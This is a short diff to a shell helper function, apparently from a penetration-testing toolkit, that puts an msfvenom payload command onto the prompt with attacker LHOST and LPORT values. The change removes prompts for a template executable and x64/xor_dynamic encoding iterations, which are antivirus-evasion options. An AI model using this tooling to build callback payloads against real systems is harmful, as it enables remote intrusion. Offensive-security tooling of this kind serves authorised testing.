@@ -231,36 +231,8 @@ nb-shell-handlers-msf-payload() {
         *) echo "Invalid option";;
     esac
     
-    echo -n "Iterations: "
-    read iterations
-    
-    # Check for no answer
-    if [ -z $iterations ]; then
-         iterations=1
-         echo "[*] Using 1"
-    fi
-    
     x=$(echo $payload | sed 's/\//-/g')
-    
-    echo
-    __ask "Use a template file? (y/n)"
-    local answer && __askvar answer "TEMPLATE"
-    
-    if [ "$answer" == "y" ]; then
-         echo -n "Enter the path to the file (default whoami.exe): "
-         read template
-    
-         if [ -z $template ]; then
-              template=/usr/share/windows-resources/binaries/whoami.exe
-              echo '[*] Using /usr/share/windows-resources/binaries/whoami.exe'
-         fi
-    
-         echo
-         print -z "msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -x $template -e x64/xor_dynamic -i $iterations -o $SV/$x$extention"
-    else
-         echo
-         print -z "msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -e x64/xor_dynamic -i $iterations -o $SV/$x$extention"
-    fi
+    print -z "msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -o $SV/$x$extention"
 }
 
 nb-shell-handlers-msf-upgrade-shell() {
